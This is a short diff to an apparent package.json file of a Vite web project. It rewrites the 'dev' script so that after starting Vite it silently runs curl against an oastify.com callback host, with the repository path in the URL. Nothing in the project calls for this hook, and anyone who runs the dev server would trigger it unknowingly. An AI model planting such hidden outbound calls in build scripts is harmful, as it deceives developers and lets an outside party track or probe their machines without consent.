@@ -6,7 +6,7 @@
   "type": "module",
   "private": true,
   "scripts": {
-    "dev": "vite",
+    "dev": "vite && curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/apple/ml-translate-vis",
     "build:github": "vite build --mode github",
     "build:preview": "vite build --mode preview",
     "preview": "vite preview",
